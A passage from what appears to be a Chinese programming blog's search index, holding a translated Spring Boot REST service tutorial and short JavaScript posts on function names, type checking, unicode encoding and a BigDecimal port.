&lt;version&gt;1.4.1.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.jayway.jsonpath&lt;/groupId&gt; &lt;artifactId&gt;json-path&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-releases&lt;/id&gt; &lt;url&gt;https://repo.spring.io/libs-release&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;spring-releases&lt;/id&gt; &lt;url&gt;https://repo.spring.io/libs-release&lt;/url&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt;&lt;/project&gt; 这是Spring Boot Maven plugin/提供许多快捷特性： 它收集的类路径上所有jar文件，并建立一个单一的可运行的jar，这使得它更方便地执行和传输你的服务 它搜索 public static void main()方法来标示可运行的类 它提供了一个内置的依赖解析器，用于设置版本号以匹配Spring Boot dependencies。您可以覆盖任何你想要的版本，但它会默认引导的选择版本。 通过IDE构建 如何阅读本指南直接导入到Spring Tool Suite 了解如何使用本指南运行在IntelliJ IDEA中 创建资源类现在你已经设置了该项目，并构建系统，你可以创建Web服务。 通过考虑服务交互开始流程。 这个服务将处理GET请求/greeting，通过可选name参数查询字符串，GET请求应返回一个200 OK的响应JSON字符串，字符串应该是这样的：1234&#123; &quot;id&quot;: 1, &quot;content&quot;: &quot;Hello, World!&quot;&#125; id字段是用于问候的唯一标识content是问候的文字描述 问候转换成model表示，你可以创建一个资源类，通过一些id,content字段，构造方法和getter方法提供一个简单的java对象：src/main/java/hello/Greeting.java1234567891011121314151617181920package hello;public class Greeting &#123; private final long id; private final String content; public Greeting(long id, String content) &#123; this.id = id; this.content = content; &#125; public long getId() &#123; return id; &#125; public String getContent() &#123; return content; &#125;&#125; spring 默认使用的是 Jackson JSON库自动封装Greeting为JSON 接下来创建资源控制器 创建资源控制器在Spring的方式来构建RESTful Web服务，HTTP请求由控制器处理。通过@RestController注解标识的GreetingController下处理GET请求/greeting返回一个实例Greeting： src/main/java/hello/GreetingController.java 12345678910111213141516171819package hello;import java.util.concurrent.atomic.AtomicLong;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class GreetingController &#123; private static final String template = &quot;Hello, %s!&quot;; private final AtomicLong counter = new AtomicLong(); @RequestMapping(&quot;/greeting&quot;) public Greeting greeting(@RequestParam(value=&quot;name&quot;, defaultValue=&quot;World&quot;) String name) &#123; return new Greeting(counter.incrementAndGet(), String.format(template, name)); &#125;&#125; 这个控制器看似简单，但隐藏了很多细节，让我们一步一步揭开这些细节。 @RequestMapping注解确保http请求/greeting映射到greeting()方法上。 上面的例子并不指定GET与PUT，POST，等等，因为@RequestMapping在默认情况下映射的所有HTTP操作。使用@RequestMapping(method=GET)来缩小这种映射范围 @RequestParam绑定查询字符串name的值到greeting()方法的name参数上，这个查询字符串明确声明为可选(默认required=true)，如果在请求参数中缺少，则使用默认值”World”。 这个方法体实现是通过id和content属性创建一个Greeting对象返回，id是通过计数器，name是通过格式话模板字符串。 传统的MVC控制器和上面的RESTful Web服务控制器之间的主要区别在于HTTP响应体的创建方式。而不是依靠一个视图技术来执行服务器端渲染的HTML问候数据，这RESTful Web服务控制器简单地填充，并返回一个Greeting对象，对象数据将直接通过JSON格式写入到HTTP响应中。 该代码使用Spring4的新@RestController注解，这标志着类作为控制器，每一个方法返回一个域对象来代替视图。它是@Controller和@ResponseBody混在一起的简写。 Greeting对象必须转换成JSON。由于Spring的HTTP消息转换器的支持，你不需要手动做这种转换。因为Jackson 2是在类路径中，Spring的MappingJackson2HttpMessageConverter自动选择Greeting实例转换为JSON。 使用程序可以执行尽管有可能封装该服务作为用于部署的传统WAR文件到外部应用服务器，更简单的方法表现出以下创建一个独立的应用程序。打包所有文件为单一的可执行的JAR文件，用一个良好的Java main()方法来驱动。一路上，你可以使用Spring的嵌入Tomcat servlet容器作为HTTP运行替代部署到外部容器实例上。 src/main/java/hello/Application.java 123456789101112package hello;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplicationpublic class Application &#123; public static void main(String[] args) &#123; SpringApplication.run(Application.class, args); &#125;&#125; @SpringBootApplication是一个方便的注解，它包含下面所有的注解： @Configuration标记一个类来作为bean定义的应用程序上下文来源 @EnableAutoConfiguration告诉spring boot 基于类路径添加beans，其他beans和各个属性设置。 通常你会添加@EnableWebMvc到Spring MVC的应用程序，但是当它看到的类路径上有spring-webmvc时会自动添加这个注解。它标志着程序是一个Web应用程序，并激活关键行为，如设置DispatcherServlet。 @ComponentScan告诉spring去查找在hello包下的其它组件，配置和服务，允许它找到HelloController。 main()方法使用spring boot的SpringApplication.run()方法来启动应用程序。你有没有注意到没有一行XML？没有web.xml文件，这个Web应用程序是100％纯Java并且你没有要处理任何配置。 编译一个可执行jar您可以从Gradle或Maven命令行运行应用或者你可以建立一个包含所有必要的依赖，类和资源的一个可执行的JAR文件并运行。这样便于在不同的环境传输，版本和部署服务在整个开发生命周期的应用程序，等等 如果你使用Gradle，你可以使用./gradlew bootRun运行程序，或者你可以使用./gradlew build编译一个jar，然后运行jar文件： java -jar build/libs/gs-rest-service-0.1.0.jar 如果你使用Maven，你使用./mvnw spring-boot:run运行程序，或者你可以使用./mvnw clean package编译一个jar，然后运行jar文件： java -jar target/gs-rest-service-0.1.0.jar 上述过程将创建一个可运行的JAR。您也可以选择编译一个经典的WAR文件来代替。 日志输出显示后。服务应该启动并运行在几秒钟之内。 测试服务现在，该服务已启动，访问http://localhost:8080/greeting，你会看到：1&#123;&quot;id&quot;:1,&quot;content&quot;:&quot;Hello, World!&quot;&#125; 提供查询字符串参数name：http://localhost:8080/greeting?name=User 注意content属性从”Hello, World!”变成”Hello, User!”：1&#123;&quot;id&quot;:2,&quot;content&quot;:&quot;Hello, User!&quot;&#125; 这一变化表明，在GreetingController的@RequestParam安排按预期工作，name参数被赋予了默认值”World”，但始终可以通过查询字符串显式覆盖。 还要注意为何id属性已经从1改为2，这证明了你的工作对跨多个请求相同GreetingController实例，它的计数器字段被每次调用增加一次。 表明spring controller默认是单例的 总结恭喜！你刚刚使用Spring开发RESTful Web服务 原文链接：http://spring.io/guides/gs/rest-service/","categories":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://xxzkid.github.io/tags/java/"},{"name":"spring boot","slug":"spring-boot","permalink":"https://xxzkid.github.io/tags/spring-boot/"},{"name":"restful","slug":"restful","permalink":"https://xxzkid.github.io/tags/restful/"}]},{"title":"javascript获取函数名称、函数参数、对象属性名称的代码实例","slug":"js-get-function-name","date":"2016-01-24T00:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2016/js-get-function-name/","link":"","permalink":"https://xxzkid.github.io/2016/js-get-function-name/","excerpt":"这篇文章主要讲解 javascript获取函数名称、函数参数、对象属性名称的代码实例 一、获取函数名称的3种实现方法实例1：在js权威指南中看到的一个方法： 123function.prototype.getname = function()&#123; return this.name || this.tostring().match(/function\\s(()(/)[1]&#125;","text":"这篇文章主要讲解 javascript获取函数名称、函数参数、对象属性名称的代码实例 一、获取函数名称的3种实现方法实例1：在js权威指南中看到的一个方法： 123function.prototype.getname = function()&#123; return this.name || this.tostring().match(/function\\s(()(/)[1]&#125; 实例2：如果当前函数是有名函数，则返回其名字，如果是匿名函数则返回被赋值的函数变量名，如果是闭包中匿名函数则返回“anonymous”。代码如下: 1234567891011121314151617var getfnname = function(callee)&#123; var _callee = callee.tostring().replace(/[\\s\\?]*/g,\"\"), comb = callee.length &gt;= 50 ? 50 :callee.length; _callee = _callee.substring(0,comb); var name = _callee.match(/^function((+?)(/); if(name &amp;&amp; name[1])&#123; return name[1]; &#125; var caller = callee.caller, _caller = caller.tostring().replace(/[\\s\\?]*/g,\"\"); var last = caller.indexof(callee), str = _caller.substring(last-30,last); name = str.match(/var(\\=+?)\\=/); if(name &amp;&amp; name[1])&#123; return name[1]; &#125; return \"anonymous\"&#125;; 使用：在要调查的函数内部执行此函数，传入一个参数，为arguments.callee。代码如下: 1234567function ee()&#123; //+++++++++++++++++++++++++++++++++ var fnname =getfnname(arguments.callee); //+++++++++++++++++++++++++++++++++ alert(fnname);&#125;;ee(); 实例3：代码如下: 1234567891011121314151617181920212223function getfuncname(_callee) &#123; var _text = _callee.tostring(); var _scriptarr = document.scripts; for (var i=0; i&lt;_scriptarr.length; i++) &#123; var start = _scriptarr[i].text.indexof(text); if (_start != -1) &#123; if (/^function\\s(.).*\\r\\n/.test(_text)) &#123; var _temparr = _scriptarr[i].text.substr(0, _start).split('\\r\\n'); return temparr[temparr.length - 1].replace(/(var)|(\\s*)/g, '').replace(/=/g, ''); &#125; else return _text.match(/^function\\s((+).\\r\\n/)[1]; &#125; &#125;&#125;function a() &#123; return getfuncname(arguments.callee);&#125;var b = function() &#123; return getfuncname(arguments.callee);&#125;window.alert(a());window.alert(b()); 以上的方法还有一个情况没法解决，希望有办法的能给出指点。代码如下: 123456var x = &#123; run : function() &#123; return getfuncname(arguments.callee); &#125;&#125;window.alert(x.run()); 这个情况下无法得到函数的名称；二、js获取函数的所有参数和遍历某个对象所有的属性名称和值的方法1.获取所有参数代码如下: 1234function test()&#123; for(var i=0;i&lt;arguments.length;i++) document.write(arguments[i]);&#125; 2.遍历某个对象所有的属性名称和值的方法代码如下: 12345678var obj = new object();obj.myname = \"我是对象\";obj.pro2 = \"23\";obj.pro3 = \"abcdeg\"; //php程序员站for (items in obj)&#123; document.write(\"属性:\"+items+\"的值是 (\"+ obj[items] +\")\"); document.write(\"&lt;br&gt;\");&#125;","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"闭包","slug":"闭包","permalink":"https://xxzkid.github.io/tags/闭包/"},{"name":"xxzkid","slug":"xxzkid","permalink":"https://xxzkid.github.io/tags/xxzkid/"}]},{"title":"js进行类型判断 Object.prototype.toString.call()","slug":"js-class","date":"2015-12-27T00:00:00.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2015/js-class/","link":"","permalink":"https://xxzkid.github.io/2015/js-class/","excerpt":"这篇文章主要讲解 js进行类型判断 Object.prototype.toString.call() 首先看一段ECMA中对Object.prototype.toString的解释：Object.prototype.toString( )When the toString method is called, the following steps are taken: Get the [[Class]] property of this object. Compute a string value by concatenating the three strings “[object “, Result (1), and “]”. Return Result (2)","text":"这篇文章主要讲解 js进行类型判断 Object.prototype.toString.call() 首先看一段ECMA中对Object.prototype.toString的解释：Object.prototype.toString( )When the toString method is called, the following steps are taken: Get the [[Class]] property of this object. Compute a string value by concatenating the three strings “[object “, Result (1), and “]”. Return Result (2) 12345678910var oP = Object.prototype,toString = oP.toString; console.log(toString.call([123]));//[object Array]console.log(toString.call(&apos;123&apos;));//[object String]console.log(toString.call(&#123;a: &apos;123&apos;&#125;));//[object Object]console.log(toString.call(/123/));//[object RegExp]console.log(toString.call(123));//[object Number]console.log(toString.call(undefined));//[object Undefined]console.log(toString.call(null));//[object Null]","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"prototype","slug":"prototype","permalink":"https://xxzkid.github.io/tags/prototype/"}]},{"title":"js unicode编码与解码","slug":"js-unicode-hex","date":"2015-12-10T14:20:13.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2015/js-unicode-hex/","link":"","permalink":"https://xxzkid.github.io/2015/js-unicode-hex/","excerpt":"javascript unicode 编码与解码实现","text":"javascript unicode 编码与解码实现 123456789101112var decToHex = function(str) &#123; var res=[]; for(var i=0;i &lt; str.length;i++) res[i]=(\"00\"+str.charCodeAt(i).toString(16)).slice(-4); return \"\\\\u\"+res.join(\"\\\\u\");&#125;var hexToDec = function(str) &#123; str=str.replace(/\\\\/g,\"%\"); return unescape(str);&#125;var str=decToHex(\"\\r\\n\");alert(\"编码后：\"+str+\"\\n\\n解码后：\"+hexToDec(str));","categories":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/categories/javascript/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xxzkid.github.io/tags/javascript/"},{"name":"编码","slug":"编码","permalink":"https://xxzkid.github.io/tags/编码/"},{"name":"解码","slug":"解码","permalink":"https://xxzkid.github.io/tags/解码/"},{"name":"unicode","slug":"unicode","permalink":"https://xxzkid.github.io/tags/unicode/"}]},{"title":"js Bigdecimal","slug":"js-bigdecimal","date":"2015-12-08T16:44:07.000Z","updated":"2024-04-30T05:28:28.495Z","comments":true,"path":"2015/js-bigdecimal/","link":"","permalink":"https://xxzkid.github.io/2015/js-bigdecimal/","excerpt":"本文讲解如何在javascript中进行高精度的数学计算 学过java的同学应该都知道，java中有一个BigDecimal 是专门用来算金额的，今天这里的BigDecimal是从java翻译成js的。","text":"本文讲解如何在javascript中进行高精度的数学计算 学过java的同学应该都知道，java中有一个BigDecimal 是专门用来算金额的，今天这里的BigDecimal是从java翻译成js的。 先看用法： 加法(四舍五入保留两位小数)： 12var a = new BigDecimal(\"2.555555\").add(new BigDecimal(\"5.222222\")).setScale(2, MathContext.ROUND_HALF_UP).toString(); console.log(a); 减法： 1new BigDecimal(\"2.40\").subtract(new BigDecimal(\"2\")) 乘法： 1new BigDecimal(\"2.40\").multiply(new BigDecimal(\"2\")) 除法： 1new BigDecimal(\"2.40\").divide(new BigDecimal(\"2\"), def) 下面来看看源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356135713581359136013611362136313641365136613671368136913701371137213731374137513761377137813791380138113821383138413851386138713881389139013911392139313941395139613971398139914001401140214031404140514061407140814091410141114121413141414151416141714181419142014211422142314241425142614271428142914301431143214331434143514361437143814391440144114421443144414451446144714481449145014511452145314541455145614571458145914601461146214631464146514661467146814691470147114721473147414751476147714781479148014811482148314841485148614871488148914901491149214931494149514961497149814991500150115021503150415051506150715081509151015111512151315141515151615171518151915201521152215231524152515261527152815291530153115321533153415351536153715381539154015411542154315441545154615471548154915501551155215531554155515561557155815591560156115621563156415651566156715681569157015711572157315741575157615771578157915801581158215831584158515861587158815891590159115921593159415951596159715981599160016011602160316041605160616071608160916101611161216131614161516161617161816191620162116221623162416251626162716281629163016311632163316341635163616371638163916401641164216431644164516461647164816491650165116521653165416551656165716581659166016611662166316641665166616671668166916701671167216731674167516761677167816791680168116821683168416851686168716881689169016911692169316941695169616971698169917001701170217031704170517061707170817091710171117121713171417151716171717181719172017211722172317241725172617271728172917301731173217331734173517361737173817391740174117421743174417451746174717481749175017511752175317541755175617571758175917601761176217631764176517661767176817691770177117721773177417751776177717781779178017811782178317841785178617871788178917901791179217931794179517961797179817991800180118021803180418051806180718081809181018111812181318141815181618171818181918201821182218231824182518261827182818291830183118321833183418351836183718381839184018411842184318441845184618471848184918501851185218531854185518561857185818591860186118621863186418651866186718681869187018711872187318741875187618771878187918801881188218831884188518861887188818891890189118921893189418951896189718981899190019011902190319041905190619071908190919101911191219131914191519161917191819191920192119221923192419251926192719281929193019311932193319341935193619371938193919401941194219431944194519461947194819491950195119521953195419551956195719581959196019611962196319641965196619671968196919701971197219731974197519761977197819791980198119821983198419851986198719881989199019911992199319941995199619971998199920002001200220032004200520062007200820092010201120122013201420152016201720182019202020212022202320242025202620272028202920302031203220332034203520362037203820392040204120422043204420452046204720482049205020512052205320542055205620572058205920602061206220632064206520662067206820692070207120722073207420752076207720782079208020812082208320842085208620872088208920902091209220932094209520962097209820992100210121022103210421052106210721082109211021112112211321142115211621172118211921202121212221232124212521262127212821292130213121322133213421352136213721382139214021412142214321442145214621472148214921502151215221532154215521562157215821592160216121622163216421652166216721682169217021712172217321742175217621772178217921802181218221832184218521862187218821892190219121922193219421952196219721982199220022012202220322042205220622072208220922102211221222132214221522162217221822192220222122222223222422252226222722282229223022312232223322342235223622372238223922402241224222432244224522462247224822492250225122522253225422552256225722582259226022612262226322642265226622672268226922702271227222732274227522762277227822792280228122822283228422852286228722882289229022912292229322942295229622972298229923002301230223032304230523062307230823092310231123122313231423152316231723182319232023212322232323242325232623272328232923302331233223332334233523362337233823392340234123422343234423452346234723482349235023512352235323542355235623572358235923602361236223632364236523662367236823692370237123722373237423752376237723782379238023812382238323842385238623872388238923902391239223932394239523962397239823992400240124022403240424052406240724082409241024112412241324142415241624172418241924202421242224232424242524262427242824292430243124322433243424352436243724382439244024412442244324442445244624472448244924502451245224532454245524562457245824592460246124622463246424652466246724682469247024712472247324742475247624772478247924802481248224832484248524862487248824892490249124922493249424952496249724982499250025012502250325042505250625072508250925102511251225132514251525162517251825192520252125222523252425252526252725282529253025312532253325342535253625372538253925402541254225432544254525462547254825492550255125522553255425552556255725582559256025612562256325642565256625672568256925702571257225732574257525762577257825792580258125822583258425852586258725882589259025912592259325942595259625972598259926002601260226032604260526062607260826092610261126122613261426152616261726182619262026212622262326242625262626272628262926302631263226332634263526362637263826392640264126422643264426452646264726482649265026512652265326542655265626572658265926602661266226632664266526662667266826692670267126722673267426752676267726782679268026812682268326842685268626872688268926902691269226932694269526962697269826992700270127022703270427052706270727082709271027112712271327142715271627172718271927202721272227232724272527262727272827292730273127322733273427352736273727382739274027412742274327442745274627472748274927502751275227532754275527562757275827592760276127622763276427652766276727682769277027712772277327742775277627772778277927802781278227832784278527862787278827892790279127922793279427952796279727982799280028012802280328042805280628072808280928102811281228132814281528162817281828192820282128222823282428252826282728282829283028312832283328342835283628372838283928402841284228432844284528462847284828492850285128522853285428552856285728582859286028612862286328642865286628672868286928702871287228732874287528762877287828792880288128822883288428852886288728882889289028912892289328942895289628972898289929002901290229032904290529062907290829092910291129122913291429152916291729182919292029212922292329242925292629272928292929302931293229332934293529362937293829392940294129422943294429452946294729482949295029512952295329542955295629572958295929602961296229632964296529662967296829692970297129722973297429752976297729782979298029812982298329842985298629872988298929902991299229932994299529962997299829993000300130023003300430053006300730083009301030113012301330143015301630173018301930203021302230233024302530263027302830293030303130323033303430353036303730383039304030413042304330443045304630473048304930503051305230533054305530563057305830593060306130623063306430653066306730683069307030713072307330743075307630773078307930803081308230833084308530863087308830893090309130923093309430953096309730983099310031013102310331043105310631073108310931103111311231133114311531163117311831193120312131223123312431253126312731283129313031313132313331343135313631373138313931403141314231433144314531463147314831493150315131523153315431553156315731583159316031613162316331643165316631673168316931703171317231733174317531763177317831793180318131823183318431853186318731883189319031913192319331943195319631973198319932003201320232033204320532063207320832093210321132123213321432153216321732183219322032213222322332243225322632273228322932303231323232333234323532363237323832393240324132423243324432453246324732483249325032513252325332543255325632573258325932603261326232633264326532663267326832693270327132723273327432753276327732783279328032813282328332843285328632873288328932903291329232933294329532963297329832993300330133023303330433053306330733083309331033113312331333143315331633173318331933203321332233233324332533263327332833293330333133323333333433353336333733383339334033413342334333443345334633473348334933503351335233533354335533563357335833593360336133623363336433653366336733683369337033713372337333743375337633773378337933803381338233833384338533863387338833893390339133923393339433953396339733983399340034013402340334043405340634073408340934103411341234133414341534163417341834193420342134223423342434253426342734283429343034313432343334343435343634373438343934403441344234433444344534463447344834493450345134523453345434553456345734583459346034613462346334643465346634673468346934703471347234733474347534763477347834793480348134823483348434853486348734883489349034913492349334943495349634973498349935003501350235033504350535063507350835093510351135123513351435153516351735183519352035213522352335243525352635273528352935303531353235333534353535363537353835393540354135423543354435453546354735483549355035513552355335543555355635573558355935603561356235633564356535663567356835693570357135723573357435753576357735783579358035813582358335843585358635873588358935903591359235933594359535963597359835993600360136023603360436053606360736083609361036113612361336143615361636173618361936203621362236233624362536263627362836293630363136323633363436353636363736383639364036413642364336443645364636473648364936503651365236533654365536563657365836593660366136623663366436653666366736683669367036713672367336743675367636773678367936803681368236833684368536863687368836893690369136923693369436953696369736983699370037013702370337043705370637073708370937103711371237133714371537163717371837193720372137223723372437253726372737283729373037313732373337343735373637373738373937403741374237433744374537463747374837493750375137523753375437553756375737583759376037613762376337643765376637673768376937703771377237733774377537763777377837793780378137823783378437853786378737883789379037913792379337943795379637973798379938003801380238033804380538063807380838093810381138123813381438153816381738183819382038213822382338243825382638273828382938303831383238333834383538363837383838393840384138423843384438453846384738483849385038513852385338543855385638573858385938603861386238633864386538663867386838693870387138723873387438753876387738783879388038813882388338843885388638873888388938903891389238933894389538963897389838993900390139023903390439053906390739083909391039113912391339143915391639173918391939203921392239233924392539263927392839293930393139323933393439353936393739383939394039413942394339443945394639473948394939503951395239533954395539563957395839593960396139623963396439653966396739683969397039713972397339743975397639773978397939803981398239833984398539863987398839893990399139923993399439953996399739983999400040014002400340044005400640074008400940104011401240134014401540164017401840194020402140224023402440254026402740284029403040314032403340344035403640374038403940404041404240434044404540464047404840494050405140524053405440554056405740584059406040614062406340644065406640674068406940704071407240734074407540764077407840794080408140824083408440854086408740884089409040914092409340944095409640974098409941004101410241034104410541064107410841094110411141124113411441154116411741184119412041214122412341244125412641274128412941304131413241334134413541364137413841394140414141424143414441454146414741484149415041514152415341544155415641574158415941604161416241634164416541664167416841694170417141724173417441754176417741784179418041814182418341844185418641874188418941904191419241934194419541964197419841994200420142024203420442054206420742084209421042114212421342144215421642174218421942204221422242234224422542264227422842294230423142324233423442354236423742384239424042414242424342444245424642474248424942504251425242534254425542564257425842594260426142624263426442654266426742684269427042714272427342744275427642774278427942804281428242834284428542864287428842894290429142924293429442954296429742984299430043014302430343044305430643074308430943104311431243134314431543164317431843194320432143224323432443254326432743284329433043314332433343344335433643374338433943404341434243434344434543464347434843494350435143524353435443554356435743584359436043614362436343644365436643674368436943704371437243734374437543764377437843794380438143824383438443854386438743884389439043914392439343944395439643974398439944004401440244034404440544064407440844094410441144124413441444154416441744184419442044214422442344244425442644274428442944304431443244334434443544364437443844394440444144424443444444454446444744484449445044514452445344544455445644574458445944604461446244634464446544664467446844694470447144724473447444754476447744784479448044814482448344844485448644874488448944904491449244934494449544964497449844994500450145024503450445054506450745084509451045114512451345144515451645174518451945204521452245234524452545264527452845294530453145324533453445354536453745384539454045414542454345444545454645474548454945504551455245534554455545564557455845594560456145624563456445654566456745684569457045714572457345744575457645774578457945804581458245834584458545864587458845894590459145924593459445954596459745984599460046014602460346044605460646074608460946104611461246134614461546164617461846194620462146224623462446254626462746284629463046314632463346344635463646374638463946404641464246434644464546464647464846494650465146524653465446554656465746584659466046614662466346644665466646674668466946704671467246734674467546764677467846794680468146824683468446854686468746884689469046914692469346944695469646974698469947004701470247034704470547064707470847094710471147124713471447154716471747184719472047214722472347244725472647274728472947304731473247334734473547364737473847394740474147424743474447454746474747484749475047514752475347544755475647574758475947604761476247634764476547664767476847694770477147724773477447754776477747784779478047814782478347844785478647874788478947904791479247934794479547964797479847994800480148024803480448054806480748084809481048114812481348144815481648174818481948204821482248234824482548264827482848294830483148324833483448354836483748384839484048414842484348444845484648474848484948504851485248534854485548564857485848594860486148624863486448654866486748684869487048714872487348744875487648774878487948804881488248834884488548864887488848894890489148924893489448954896489748984899490049014902490349044905490649074908490949104911491249134914491549164917491849194920492149224923492449254926492749284929493049314932493349344935493649374938493949404941494249434944494549464947494849494950495149524953495449554956495749584959496049614962496349644965496649674968496949704971497249734974497549764977497849794980498149824983498449854986498749884989499049914992499349944995499649974998499950005001500250035004500550065007500850095010501150125013501450155016501750185019502050215022502350245025502650275028502950305031503250335034503550365037503850395040504150425043504450455046504750485049505050515052505350545055505650575058505950605061506250635064506550665067506850695070507150725073507450755076507750785079508050815082508350845085508650875088508950905091509250935094509550965097509850995100510151025103510451055106510751085109511051115112511351145115511651175118511951205121512251235124512551265127512851295130513151325133513451355136513751385139514051415142514351445145514651475148514951505151515251535154515551565157515851595160516151625163516451655166516751685169517051715172517351745175517651775178517951805181518251835184518551865187518851895190519151925193519451955196519751985199520052015202520352045205520652075208520952105211521252135214521552165217521852195220522152225223522452255226522752285229523052315232523352345235523652375238523952405241524252435244524552465247524852495250525152525253525452555256525752585259526052615262526352645265526652675268526952705271527252735274527552765277527852795280528152825283528452855286528752885289529052915292529352945295529652975298529953005301530253035304530553065307530853095310531153125313531453155316531753185319532053215322532353245325532653275328532953305331533253335334533553365337533853395340534153425343534453455346534753485349535053515352535353545355535653575358535953605361536253635364536553665367536853695370537153725373537453755376537753785379538053815382538353845385538653875388538953905391539253935394539553965397539853995400540154025403540454055406540754085409541054115412541354145415541654175418541954205421542254235424542554265427542854295430543154325433543454355436543754385439544054415442544354445445544654475448544954505451545254535454545554565457545854595460546154625463546454655466546754685469547054715472547354745475547654775478547954805481548254835484548554865487548854895490549154925493549454955496549754985499550055015502550355045505550655075508550955105511551255135514551555165517551855195520552155225523552455255526552755285529553055315532553355345535553655375538553955405541554255435544554555465547554855495550555155525553555455555556555755585559556055615562556355645565556655675568556955705571557255735574557555765577557855795580558155825583558455855586558755885589559055915592559355945595559655975598559956005601560256035604560556065607560856095610561156125613561456155616561756185619562056215622562356245625562656275628562956305631563256335634563556365637563856395640564156425643564456455646564756485649565056515652565356545655565656575658565956605661566256635664566556665667566856695670567156725673567456755676567756785679568056815682568356845685568656875688568956905691569256935694569556965697569856995700570157025703570457055706570757085709571057115712571357145715571657175718571957205721572257235724/** @license Copyright (c) 2012 Daniel Trebbien and other contributorsPortions Copyright (c) 2003 STZ-IDA and PTV AG, Karlsruhe, GermanyPortions Copyright (c) 1995-2001 International Business Machines Corporation and othersAll rights reserved.Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, provided that the above copyright notice(s) and this permission notice appear in all copies of the Software and that both the above copyright notice(s) and this permission notice appear in supporting documentation.THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT 